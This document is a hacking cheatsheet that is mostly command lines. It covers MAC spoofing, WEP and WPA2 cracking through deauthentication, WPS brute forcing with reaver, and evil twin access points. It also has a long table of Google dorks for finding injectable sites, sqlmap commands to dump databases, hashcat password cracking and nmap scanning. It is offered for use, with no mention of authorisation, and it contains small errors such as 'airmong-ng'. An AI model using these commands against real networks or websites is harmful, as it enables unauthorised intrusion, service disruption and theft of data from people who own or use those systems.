# Hacking-cheatsheet-including-WPA2-WEP-sqlmap-nmap-...-
Hacking cheatsheet (including WPA2, WEP, sqlmap, nmap, ...)
Basic

Bring interface down

Code:
ifconfig <interface> down


Bring interface up

Code:
ifconfig <interface> up


Change MAC address

with macchanger:

Code:
macchanger --mac=XX:XX:XX:XX:XX:XX <interface>


OR

Code:
macchanger -r <interface>


with ifconfig:


Code:
ifconfig <interface> down
ifconfig <interface> hw ether XX:XX:XX:XX:XX:XX
ifconfig <interface> up



Airbase

Starting airodump

Code:
sudo airodump-ng <interface>


Checking for possible interfering processes


Code:
sudo airmong-ng check



If you want to kill these processes:

Code:
sudo airmong-ng check kill 


Putting interface in monitor mode


Code:
ifconfig <interface> down
iwconfig <interface> mode monitor
ifconfig <interface> up


OR

Code:
airmon-ng start <interface>


Cracking WEP

1. Writing capture to file

Code:
airodump-ng --bssid <bssid> -c <channel> -w <filename> <interface>


2. Injecting ARP traffic


Code:
aireplay-ng -3 -b <bssid> -h <MACaddressCLIENT> <interface>


3. Start cracking!


Code:
aircrack-ng <filename>.cap


Cracking WPA2

Dictionary attack

1. Writing capture to file

Code:
airodump-ng --bssid <bssid> -c <channel> -w <filename> <interface>


2. Deauthenticate client for handshake

Broadcasting deauth:

Code:
sudo aireplay-ng --deauth 100 -a <bssid> <interface>


Targeted deauth:

Code:
sudo aireplay-ng --deauth 100 -a <bssid> -c <MACaddressCLIENT> <interface>


3. Start cracking!

Code:
aircrack-ng -w <dictionary> -b <bssid> <filename>.cap


WPS attack

1. Check if WPS is enabled

Code:
sudo wash -i <MACaddressCLIENT>


2. Attack

Code:
sudo reaver -i <interface> -b <MACaddressCLIENT> -vv -c <channel>


Evil twin attack

1. Setup twin

Code:
airbase-ng -a <bssid> --essid <essid> -c <channel> <interface>


2. Deauth current clients


Code:
aireplay-ng --deauth 0 -a <bssid> <interface>



SQL Injection



Check if website is vulnerable

Example site:
http://www.sqldummy.com/cgi-bin/item.cqi?item_id=15

Now add a single quotation mark to the end:
http://www.sqldummy.com/cgi-bin/item.cqi?item_id=15'

If the page returns an SQL error, the page is vulnerable to injection.

Google dorks

Code:
|-----------------------------------------------------------------------------------------------------------|
| inurl:item_id=                      | inurl:review.php?id=            | inurl:hosting_info.php?id=        |
| inurl:newsid=                       | inurl:iniziativa.php?in=        | inurl:gallery.php?id=             |
| inurl:trainers.php?id=              | inurl:curriculum.php?id=        | inurl:rub.php?idr=                |
| inurl:news-full.php?id=             | inurl:labels.php?id=            | inurl:view_faq.php?id=            |
| inurl:news_display.php?getid=       | inurl:story.php?id=             | inurl:artikelinfo.php?id=         |
| inurl:index2.php?option=            | inurl:look.php?ID=              | inurl:detail.php?ID=              |
| inurl:readnews.php?id=              | inurl:newsone.php?id=           | inurl:index.php?=                 |
| inurl:top10.php?cat=                | inurl:aboutbook.php?id=         | inurl:profile_view.php?id=        |
| inurl:newsone.php?id=               | inurl:material.php?id=          | inurl:category.php?id=            |
| inurl:event.php?id=                 | inurl:opinions.php?id=          | inurl:publications.php?id=        |
| inurl:product-item.php?id=          | inurl:announce.php?id=          | inurl:fellows.php?id=             |
| inurl:sql.php?id=                   | inurl:rub.php?idr=              | inurl:downloads_info.php?id=      |
| inurl:index.php?catid=              | inurl:galeri_info.php?l=        | inurl:prod_info.php?id=           |
| inurl:news.php?catid=               | inurl:tekst.php?idt=            | inurl:shop.php?do=part&id=        |
| inurl:index.php?id=                 | inurl:newscat.php?id=           | inurl:productinfo.php?id=         |
| inurl:news.php?id=                  | inurl:newsticker_info.php?idn=  | inurl:collectionitem.php?id=      |
| inurl:index.php?id=                 | inurl:rubrika.php?idr=          | inurl:band_info.php?id=           |
| inurl:trainers.php?id=              | inurl:rubp.php?idr=             | inurl:product.php?id=             |
| inurl:buy.php?category=             | inurl:offer.php?idf=            | inurl:releases.php?id=            |
| inurl:article.php?ID=               | inurl:art.php?idm=              | inurl:ray.php?id=                 |
| inurl:play_old.php?id=              | inurl:title.php?id=             | inurl:produit.php?id=             |
| inurl:declaration_more.php?decl_id= | inurl:news_view.php?id=         | inurl:pop.php?id=                 |
| inurl:pageid=                       | inurl:select_biblio.php?id=     | inurl:shopping.php?id=            |
| inurl:games.php?id=                 | inurl:humor.php?id=             | inurl:productdetail.php?id=       |
| inurl:page.php?file=                | inurl:aboutbook.php?id=         | inurl:post.php?id=                |
| inurl:newsDetail.php?id=            | inurl:ogl_inet.php?ogl_id=      | inurl:viewshowdetail.php?id=      |
| inurl:gallery.php?id=               | inurl:fiche_spectacle.php?id=   | inurl:clubpage.php?id=            |
| inurl:article.php?id=               | inurl:communique_detail.php?id= | inurl:memberInfo.php?id=          |
| inurl:show.php?id=                  | inurl:sem.php3?id=              | inurl:section.php?id=             |
| inurl:staff_id=                     | inurl:kategorie.php4?id=        | inurl:theme.php?id=               |
| inurl:newsitem.php?num=             | inurl:news.php?id=              | inurl:page.php?id=                |
| inurl:readnews.php?id=              | inurl:index.php?id=             | inurl:shredder-categories.php?id= |
| inurl:top10.php?cat=                | inurl:faq2.php?id=              | inurl:tradeCategory.php?id=       |
| inurl:historialeer.php?num=         | inurl:show_an.php?id=           | inurl:product_ranges_view.php?ID= |
| inurl:reagir.php?num=               | inurl:preview.php?id=           | inurl:shop_category.php?id=       |
| inurl:Stray-Questions-View.php?num= | inurl:loadpsb.php?id=           | inurl:transcript.php?id=          |
| inurl:forum_bds.php?num=            | inurl:opinions.php?id=          | inurl:channel_id=                 |
| inurl:game.php?id=                  | inurl:spr.php?id=               | inurl:aboutbook.php?id=           |
| inurl:view_product.php?id=          | inurl:pages.php?id=             | inurl:preview.php?id=             |
| inurl:newsone.php?id=               | inurl:announce.php?id=          | inurl:loadpsb.php?id=             |
| inurl:sw_comment.php?id=            | inurl:clanek.php4?id=           | inurl:pages.php?id=               |
| inurl:news.php?id=                  | inurl:participant.php?id=       |                                   |
| inurl:avd_start.php?avd=            | inurl:download.php?id=          |                                   |
| inurl:event.php?id=                 | inurl:main.php?id=              |                                   |
| inurl:product-item.php?id=          | inurl:review.php?id=            |                                   |
| inurl:sql.php?id=                   | inurl:chappies.php?id=          |                                   |
|-----------------------------------------------------------------------------------------------------------|


sqlmap

List databases on website


Code:
sqlmap -u <website> --dbs



List tables of database


Code:
sqlmap -u <website> -D <database> --tables


List column names of table


Code:
sqlmap -u <website> -D <database> -T <table> --columns


List column data of table


Code:
sqlmap -u <website> -D <database> -T <table> -C <column> --dump

Dumping output to file

add --dump


Cracking a hashed password

Identify hash type

use HashID

Crack hash

1. Get code for hash type


Code:
./oclHashcat.bin --help | grep <hashtype>


2. Start cracking


Code:
./oclHashcat.bin -m <code> <hashfile> <dictionary>



Nmap

Scan single host
  

Code:
nmap 192.168.0.1


Scan multiple hosts


Code:
nmap 192.168.0.1-20


Scan subnet


Code:
nmap 192.168.0.0/24


Parameters

Discover IPs


Code:
nmap -sP


Identify OS of host


Code:
nmap -O


Identify hostname


Code:
nmap -sL


Verbose output


Code:
nmap -v


MAC addresses


Code:
nmap -n


Fast scan

This checks for the 100 most common ports.


Code:
nmap -T4 -F

That's it. Enjoy.
